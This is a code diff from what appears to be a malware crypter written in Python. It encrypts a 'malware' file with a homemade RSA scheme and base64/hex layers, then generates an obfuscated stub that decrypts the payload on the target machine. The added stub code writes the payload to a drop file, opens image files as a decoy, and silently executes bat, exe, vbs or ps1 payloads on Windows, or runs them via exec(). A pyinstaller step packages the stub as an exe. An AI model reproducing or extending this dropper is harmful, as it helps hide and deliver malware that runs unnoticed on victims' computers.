@@ -64,10 +64,15 @@ class StartModule():
 		return (prime_a, prime_b)
 
 	def encrypt(self, private_key, plaintext):
-		Logger.printMessage(message='{methodName}'.format(methodName='encrypt'), description='{private_key}'.format(private_key=private_key), debug_module=True)
+		Logger.printMessage(message='{methodName}'.format(methodName='encrypt'), description='{private_key} - {msg}'.format(private_key=private_key, msg=plaintext[0:10]), debug_module=True)
 		#Unpack the key into it's components
 		key, n = private_key
-		mensaje = self.__mensajeASCII__(plaintext)
+		ba64 = base64.b64encode(plaintext)
+		ashex = self.__ASCII_Hex__(ba64)
+		hexba64 = self.__Hex_Base64__(ashex)
+		ba64un = self.__unirBase64__(hexba64)
+		decasc = self.__decimal_ASCII__(ba64un)
+		mensaje = self.__mensajeASCII__(decasc)
 		mensaje1 = [(ord(chr(char)) ** key) % n for char in mensaje]
 		mensajeHex = self.__ASCII_Hex__(mensaje1)
 		mensajeBase64 = self.__Hex_Base64__(mensajeHex)
@@ -83,7 +88,12 @@ class StartModule():
 		mensajeDecimalRecibido = self.__Hex_decimal__(mensajeHexRecibido)
 		mensajeDescifrado = [((char ** key) % n) for char in mensajeDecimalRecibido]
 		mensaje_de_ascii = self.__decimal_ASCII__(mensajeDescifrado)
-		return ''.join(mensaje_de_ascii)
+		decasc = self.__recibirBase64__(''.join(mensaje_de_ascii).encode())
+		hexba64 = self.__Base64_Hex__(decasc)
+		ashex = self.__Hex_decimal__(hexba64)
+		deasc = self.__decimal_ASCII__(ashex)
+		ba64 = base64.b64decode(deasc.encode())
+		return ba64
 
 	def __gcd__(self, a, b):
 		'''
@@ -123,42 +133,50 @@ class StartModule():
 		return True
 
 	def __mensajeASCII__(self, mensaje):
+		Logger.printMessage(message='{methodName}'.format(methodName='__mensajeASCII__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
 		men = []
 		for palabra in mensaje:
 			men.append(ord(palabra))
 		return men
 
 	def __ASCII_Hex__(self, mensaje):
+		Logger.printMessage(message='{methodName}'.format(methodName='__ASCII_Hex__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
 		mensajeHex = []
 		for numero in mensaje:
 			mensajeHex.append(hex(numero)[2:])
 		return mensajeHex
 
 	def __Hex_Base64__(self, mensaje):
+		Logger.printMessage(message='{methodName}'.format(methodName='__Hex_Base64__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
 		mensajeBase64 = []
 		for numero in mensaje:
 			mensajeBase64.append(base64.b64encode(numero.encode()))
 		return mensajeBase64
 
 	def __unirBase64__(self, mensaje):
+		Logger.printMessage(message='{methodName}'.format(methodName='__unirBase64__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
 		msg_base64 = "".encode()
 		for i in range(0, len(mensaje)):
 			msg_base64 = msg_base64 + mensaje[i]
+		Logger.printMessage(message='{methodName}'.format(methodName='__unirBase64__'), description='{msg_base64} ...'.format(msg_base64=msg_base64[0:10]), debug_module=True)
 		return msg_base64
 
 	def __recibirBase64__(self, mensaje):
+		Logger.printMessage(message='{methodName}'.format(methodName='__recibirBase64__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
 		msg_base64 = []
 		for i in range(0,len(mensaje), 4):
 			msg_base64.append(mensaje[i:i+4])
 		return msg_base64
 		
 	def __Base64_Hex__(self, mensaje):
+		Logger.printMessage(message='{methodName}'.format(methodName='__Base64_Hex__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
 		mensajeHex = []
 		for b64 in mensaje:
 			mensajeHex.append(base64.b64decode(b64))
 		return mensajeHex
 
 	def __Hex_decimal__(self, mensaje):
+		Logger.printMessage(message='{methodName}'.format(methodName='__Hex_decimal__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
 		mensajeDecimal = []
 		for hexa in mensaje:
 			hexa = hexa.decode("UTF-8")
@@ -167,6 +185,7 @@ class StartModule():
 		return mensajeDecimal
 
 	def __decimal_ASCII__(self, mensaje):
+		Logger.printMessage(message='{methodName}'.format(methodName='__decimal_ASCII__'), description='Length: {length} - {mensaje} ...'.format(length=len(mensaje), mensaje=mensaje[0:10]), debug_module=True)
 		mensaje1 = ""
 		for decimal in mensaje:
 			mensaje1 = mensaje1 + chr(decimal)
@@ -175,12 +194,14 @@ class StartModule():
 	# FIN RSA
 
 	def getMalwareData(self, fileName):
+		Logger.printMessage(message='{methodName}'.format(methodName='getMalwareData'), description='{fileName}'.format(fileName=fileName), debug_module=True)
 		file = open(fileName, "rb")
 		file_data = file.read()
 		file.close()
 		return file_data
 
 	def convertToExe(self, stub_name):
+		Logger.printMessage(message='{methodName}'.format(methodName='convertToExe'), description='{stub_name}'.format(stub_name=stub_name), debug_module=True)
 		# Convert py to exe with pyinstaller
 		import os
 		os.system(config['pyinstaller'].format(path=os.path.dirname(stub_name)) + " " + stub_name)
@@ -214,6 +235,7 @@ class StartModule():
 			return arg
 
 	def clean_output_dir(self):
+		Logger.printMessage(message='{methodName}'.format(methodName='clean_output_dir'), debug_module=True)
 		output_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'output'))
 		if os.path.isdir(output_dir):
 			shutil.rmtree(output_dir)
@@ -231,18 +253,24 @@ class StartModule():
 		# Create Stub in Python File
 		stub = ''
 		if is_last:
-			stub = "import argparse, math, base64, binascii, random\nfrom random import randint\n"
+			stub = "import argparse, math, base64, binascii, random, sys, subprocess, os\nfrom random import randint\n"
 			stub += "cdx = \"" + crypto_data_hex + "\"\n"
+			stub += "drpnm = \"" + drop_file_name + "\"\n"
 			stub += "pk = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
 			stub += """
 def dcy(pk, cptx):
 	k, n = pk
-	mr = __reBa64__(cptx.encode('utf-8'))
-	mhr = __ba64Hex__(mr)
-	mdr = __hexDec__(mhr)
-	md = [((c ** k) % n) for c in mdr]
-	ma = __deAS__(md)
-	return ''.join(ma)
+	mensajeRecibido = __reBa64__(cptx.encode('utf-8'))
+	mensajeHexRecibido = __ba64Hex__(mensajeRecibido)
+	mensajeDecimalRecibido = __hexDec__(mensajeHexRecibido)
+	mensajeDescifrado = [((c ** k) % n) for c in mensajeDecimalRecibido]
+	mensaje_de_ascii = __deAS__(mensajeDescifrado)
+	decasc = __reBa64__(''.join(mensaje_de_ascii).encode())
+	hexba64 = __ba64Hex__(decasc)
+	ashex = __hexDec__(hexba64)
+	deasc = __deAS__(ashex)
+	ba64 = base64.b64decode(deasc.encode())
+	return ba64
 def __reBa64__(m):
 	mBa64 = []
 	for i in range(0,len(m), 4):
@@ -251,20 +279,25 @@ def __reBa64__(m):
 def __ba64Hex__(m):
 	mHx = []
 	for b64 in m:
-		mHx.append(base64.b64decode(b64))
+		mHx.append(base64.b64decode(b64).decode("utf-8"))
 	return mHx
 def __hexDec__(m):
 	mDec = []
 	for hx in m:
-		hx = hx.decode("UTF-8")
+		hx = hx
 		n = int(hx, 16)
-		mDec.append(n)    
+		mDec.append(n)
 	return mDec
 def __deAS__(m):
 	m1 = ""
 	for d in m:
 		m1 = m1 + chr(d)
 	return m1
+def __meAS__(m):
+	men = []
+	for p in m:
+		men.append(ord(p))
+	return men
 dcy_data = dcy(pk=pk, cptx=cdx)
 """
 		if is_iterating:
@@ -272,6 +305,25 @@ dcy_data = dcy(pk=pk, cptx=cdx)
 			stub += "pk = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
 			stub += "dcy_data = dcy(pk=pk, cptx=cdx)\nexec(dcy_data.encode('utf-8'))"
 		else:
+			stub += """
+# Save file
+nf = open(drpnm, 'wb')
+try:
+\tnf.write(dcy_data)
+except:
+\tpass
+nf.close()
+image_extensions = ('jpg', 'jpeg', 'bpm', 'ico')
+exec_extensions = ('bat', 'exe', 'vbs', 'ps1')
+if drpnm.split('.')[1] in image_extensions:
+\timageViewerFromCommandLine = {'linux':'xdg-open', 'win32':'explorer', 'darwin':'open'}[sys.platform]
+\tsubprocess.run([imageViewerFromCommandLine, drpnm], close_fds=True)
+if drpnm.split('.')[1] in exec_extensions and sys.platform == 'win32':
+\tos.system(drpnm)
+# Execute file
+#import subprocess
+#proc = subprocess.Popen('python {fn}'.format(fn=drpnm), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+"""
 			stub += "exec(dcy_data)"
 
 		stub_base64 = base64.b64encode(stub.encode('utf-8'))
@@ -305,7 +357,7 @@ dcy_data = dcy(pk=pk, cptx=cdx)
 			data = self.getMalwareData(filename)
 			prime_a, prime_b = self.getRandomKeypair()
 			public, private = self.generate_keypair(prime_a, prime_b)
-			crypted_data = self.encrypt(private_key=private, plaintext=data.decode("utf-8"))
+			crypted_data = self.encrypt(private_key=private, plaintext=data)
 			new_file = new_file_name
 			if not '.' in new_file:
 				new_file = '{file}.py'.format(file=new_file)
